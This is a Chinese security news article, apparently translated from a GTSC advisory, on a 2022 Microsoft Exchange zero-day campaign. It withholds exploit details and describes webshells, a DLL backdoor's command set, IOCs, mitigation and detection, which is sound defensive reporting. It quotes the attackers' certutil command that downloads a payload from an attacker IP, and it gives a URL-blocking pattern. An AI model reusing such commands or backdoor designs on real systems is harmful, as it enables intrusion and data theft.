#  新的攻击活动利用了MICROSOFT EXCHANGE服务器上新的0 day RCE漏洞   
luochicun  嘶吼专业版   2022-10-08 12:00  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/wpkib3J60o297rwgIksvLibPOwR24tqI8dGRUah80YoBLjTBJgws2n0ibdvfvv3CCm0MIOHTAgKicmOB4UHUJ1hH5g/640?wx_fmt=gif "")  
  
8月初，在执行安全监控和事件响应服务时，GTSC SOC团队发现一个关键基础架构受到攻击，经过分析这是专门针对Microsoft Exchange应用程序的。在调查期间，GTSC Blue Team专家确定，攻击者利用了一个未公开的Exchange安全0 day 漏洞，因此立即制定了临时缓解计划。与此同时，安全专家开始研究和调试Exchange反编译代码，以查找漏洞并利用代码。经分析，该漏洞非常严重，使得攻击者能够在受攻击的系统上执行RCE。GTSC立即将该漏洞提交给Zero Day Initiative (ZDI)，以便与微软合作，尽快准备修补程序。ZDI验证并确认了2个漏洞，CVSS评分分别为8.8和6.3。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7EG1yjeEGmX1DsVFVLyAsaRnKCvibhicibeZ0cehoaPtARWjKiag9QYM1zw/640?wx_fmt=png "")  
  
不过截至目前，修复程序还未发布，GTSC已经发现其他客户也遇到了类似攻击。经过仔细测试，研究人员确认这些系统正受到此0 day零日漏洞的攻击。  
# 漏洞信息  
  
在为客户提供SOC服务时，GTSC Blueteam在IIS日志中检测到与ProxyShell漏洞格式相同的攻击请求,如下所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7RGoK2x5icM2XEglNQKlT7jsm4GZFL6aGfuzEw5gYDWVaP8jbjiaFcl4g/640?wx_fmt=png "")  
  
研究人员还检查了其他日志，发现攻击者可以在受攻击的系统上执行命令。这些Exchange服务器的版本号表明已安装最新更新，因此使用Proxyshell漏洞进行攻击的行为让研究人员可以确认这是一个新的0 day RCE漏洞。这些信息被发送给了安全分析师后，他们对为什么漏洞利用请求与ProxyShell bug类似？RCE是如何实施的？等问题进行了研究。  
  
经过分析，研究人员成功地找到了如何使用上述路径访问Exchange后端中的组件并执行RCE。然而，处于安全考虑，目前我们还不想发布该漏洞的技术细节。  
# 利用后（Post-exploit）活动  
  
在追踪到有关攻击示例后，研究人员开始收集信息并在受害者的系统中建立一个立足点。另外，攻击者还使用各种技术在受影响的系统上创建后门，并对系统中的其他服务器执行横向移动。  
# Webshell  
  
我们检测到Webshell被丢弃到Exchange服务器，其中大部分是模糊的。通过用户代理，我们检测到攻击者使用了Antsword，这是一个基于中文的开源跨平台网站管理工具，支持webshell管理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG74EK2h2K4tBEACcapqL5XLPoq1DOLmhDyZFHcD4RYPOHofG3XTFbeDw/640?wx_fmt=png "")  
  
另一个值得注意的特点是，攻击者还将文件RedirSuiteServiceProxy.aspx 的内容更改为webshell内容。RedirSuiteServiceProxy.aspx 是Exchange服务器中可用的合法文件名。  
  
在另一个客户的事件响应过程中，GTSC注意到攻击组织使用了另一个webshell模板。  
  
Filename: errorEE.aspxSHA256: be07bd9310d7a487ca2f49bcdaafb9513c0c8f99921fdf79a05eaba25b52d257Ref: https://github.com/antonioCoco/SharPyShell  
# 命令执行  
  
除了收集系统信息外，攻击者还通过certutil下载文件并检查连接，certutil是Windows环境中可用的合法工具。  
  
“cmd” /c cd /d "c:\\PerfLogs"&certutil.exe -urlcache -split -f http://206.188.196.77:8080/themes.aspx c:\perflogs\t&echo [S]&cd&echo [E]"cmd" /c cd /d "c:\\PerfLogs"&certutil.exe -urlcache -split -f https://httpbin.org/get c:\test&echo [S]&cd&echo [E]  
  
需要注意的是，每个命令都以字符串echo[S]&cd&echo[E]结尾。  
  
此外，攻击者还将恶意DLL注入内存，在受攻击的服务器上释放可疑文件，并通过WMIC执行这些文件。  
# 可疑文件  
  
在服务器上，研究人员检测到exe和dll格式的可疑文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7eGLX2RLFLvAN5Gj0Fq6bDv98NPicxfiadCLvvyErMMh00IoIP9OD00rA/640?wx_fmt=png "")  
  
在可疑文件中，根据服务器上执行的命令，研究人员确定all.exe和dump.dll负责在服务器系统上转储凭证。之后，攻击者使用rar.exe压缩转储文件并复制到Exchange服务器的webroot中。不幸的是，在响应过程中，上述文件在受攻击的系统中不再存在，可能是由于攻击者删除了证据。  
  
被释放到C:\PerfLogs\文件夹中的cmd.exe文件是标准的Windows命令行工具cmd.exe。  
# 恶意软件分析  
  
DLL信息  
  
文件名：Dll.Dll  
  
Sha256:074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d8245c8233236a69a081ee390d4faa253177180b2bd45d8ed08369e07429ffbe0a99ceca98c2b24ee30d64184d9d2470f6f2509ed914dafb87604123057a14c57c029b75f0db3006440651c6342dc3c0672210cfb339141c75e12f6c84d990931c3c8c907a67955bcdf07dd11d35f2a23498fb5ffe5c6b5d7f36870cf07da47bff2  
# DLL分析  
  
GTSC分析一个特定的样本(074eb0e75bb2d8f59f1fd571a8c5b76f9c899834893da6f7591b68531f2b5d82)来描述恶意代码的行为，其他DLL样本有类似的任务和行为，只是侦听器配置不同。  
  
DLL由两个类组成：Run和m，每个类都调用执行不同任务的方法。具体地说：  
  
Run类创建一个侦听器，侦听路径为https://*:443/ews/web/webconfig/的端口443的连接。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG78OrqsuEXame6y9UibdTdDsfM78dmNFTe72hK0ibOFB22rMrT8LKglsEA/640?wx_fmt=png "")  
  
侦听后，恶意软件创建一个调用r的新线程。方法r执行以下操作：  
  
1.检查接收到的请求正文中是否有数据，如果没有，则返回结果404。  
  
2.相反，如果请求包含数据，DLL将继续处理if分支内的流：  
  
检查收到的请求是否包含“RPDbgEsJF9o8S=”。如果是，调用类m中的方法i来处理收到的请求。从Run.m.i返回的结果将转换为一个base64字符串。以以下格式返回给客户端的结果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG79XemUCFQbgASrGqsRy7BtOGgdwp77WEg6icFUNia4UmJOoflXez3Uqpg/640?wx_fmt=png "")  
# m类  
  
方法i可以：  
  
1.使用AES算法对收到的请求进行解密，其中请求的前16个字节是IV值，后16个字节为key值，其余为数据。  
  
2.解码后，获取数组中的第一个元素作为标志，以处理定义的情况，处理定义的情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7PyAECTwbfrt4mHXuct8CicWQhpUgo9sIl9zwicU3TxtFdJvruCPTPiaHw/640?wx_fmt=png "")  
  
示例1：调用方法info。该方法主要负责收集系统信息，比如操作系统架构、框架版本、操作系统版本等信息。GTSC用下图模拟本示例。请求以以下格式发送：前16字节是IV值，后16字节是key值，后面是一个指定选项的标志，其余是数据。  
  
base64 (IV | key | aes(flag|data))  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7GEhCC1QfLicHSEQ9Es5qibxTicFxNAMI66YYnEpHgoWia0EHvibRGfibD63Q/640?wx_fmt=png "")  
  
示例2：调用方法sc，调用sc方法，该方法负责分配内存来实现shellcode。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7l8sh0yumeTFGXL58ZynIhs3uDokRuicAtM62JkDn6icCFnWjlHbMMo9Q/640?wx_fmt=png "")  
  
示例3：调用两个方法p和r。方法p处理由“|”字符分隔的数据，保存到数组array3。数组array 3将前两个元素作为方法r的参数，该方法负责执行命令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7FaLMXfSnHh9FId3dv5X1NIG8yWqWnCqqY0nl50mw0gr3BsuF5IGOcQ/640?wx_fmt=png "")  
  
示例4：调用方法ld，该方法负责以以下这种格式列出目录和文件信息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7Up9fVz2kvKBeMJfyUCYzaMPzlPagbJSMHXbHLx6ErxSkFL7NTxr8UA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG74M8OT0gfTHAcpFBbmkOobqnxc6qqClSWWxNJCLEGGSOhwFkVw3j9eQ/640?wx_fmt=png "")  
  
示例5：调用方法wf，该方法负责写入文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7I7osaHllDaDtzqoFDjvPS1SZb3rTYAdxRWQuCWD4Rr6zjZYGzWedsw/640?wx_fmt=png "")  
  
示例6：调用方法rf，该方法负责读取文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7m9mof53UtjIK6SowKclJlNJT57QXmXSuh9OO4r16eWyZcAticXPklxg/640?wx_fmt=png "")  
  
示例7：创建文件夹；  
  
示例8：删除文件或文件夹；  
  
示例9：移动文件；  
  
示例10：设置文件时间；  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7zuIicJ47ia7TUQEiblno9pQSY1F96UJHqp4h5UPm2QtO6bnBIgNnefzQQ/640?wx_fmt=png "")  
  
示例11：加载并执行从请求接收的C#字节码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7RTAGrWTF1QB7K7Q5OxORdBn4n8ZIxaAEGXOJLCcxesP4T4aicsQ32zA/640?wx_fmt=png "")  
  
其他DLL示例具有类似的任务，只是侦听器配置不同，如下所示：  
  
Victim 1:  
  
https://*:443/ews/web/webconfig/  
  
https://*:443/owa/auth/webcccsd/  
  
https://*:444/ews/auto/  
  
https://*:444/ews/web/api/  
  
Victim 2:  
  
http://*:80/owa/auth/Current/script/  
  
https://*:443/owa/auth/Current/script/  
  
GTSC还检测到DLL被注入到svchost.exe进程的内存中。DLL将数据发送和接收连接到二进制文件中固定的地址137[.]184[.]67[.]33 中。使用RC4加密算法使用C2发送和接收数据，其中密钥将在运行时生成。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG78X6fRcZ4dDK0S8ZVcLibltNJ8TOMIKPlcgfvTG8haaW6TMylDpUMttQ/640?wx_fmt=png "")  
# 临时缓解措施  
  
GTSC的直接事件响应程序已经发现了有1个组织成为利用这一0 day 漏洞的攻击活动的受害者。此外，可能还有许多其他组织被利用，但尚未被发现。在等待正式补丁的同时，GTSC提供了一个临时缓解措施，通过在IIS服务器上的URL Rewrite rule模块添加一条规则来阻止带有攻击指示器的请求，从而缓解攻击。  
  
在前端自动发现中，选择选项卡“URL重写”，选择“请求阻止”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7t7BrqH3GoXLY4rrNkC3XcdPu9xuqvH6RJJGHt7jlGxHvCkXphoVtsQ/640?wx_fmt=png "")  
  
将字符串“.*autodiscover\.json.*\@.*Powershell.*”添加到URL路径：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG775lv7Xjs20yLNC9AK8BrBFbBnIjDPrCPZTH10aIiczVU5nWHc8tib53Q/640?wx_fmt=png "")  
  
条件输入：选择{REQUEST_URI}：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7apPlgUMfYlwbtBR4QgCQAjgwdictyK2ZTXqpvUicSCcYWt4picM3LpNzw/640?wx_fmt=png "")  
  
我们建议全世界正在使用Microsoft Exchange Server的所有组织或企业尽快检查、审查并应用上述临时补救措施，以避免潜在的攻击。  
# 检测方法  
  
为了帮助组织检查他们的Exchange服务器是否已被此漏洞利用，GTSC发布了扫描IIS日志文件的指南和工具（默认存储在%SystemDrive%\inetpub\logs\LogFiles文件夹中）：  
  
方法1：使用powershell命令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG71Xx7RMAqQ0M4TvuOvicibicZzR9hQ2Tm0iadR8MRJEtPzVM2DI69ziaNEAA/640?wx_fmt=png "")  
  
方法2：使用GTSC开发的工具：基于漏洞签名，我们构建了一个比使用powershell更短的搜索时间的工具。下载链接：https://github.com/ncsgroupvn/NCSE0Scanner。  
  
参考及来源：  
https://gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7kARicCNicCFWQMzxJ1wbNwOP9OTE8um3gibkvrVrkSCf9lCicWMn0AHefw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o29VibGB9HkZ06NPHDtjzowG7PT1kZzm7KtiaL7W549XcDyGiaoCWFTs4SdRicK4gSbSEzY4gLvjKCh2qA/640?wx_fmt=png "")  
  
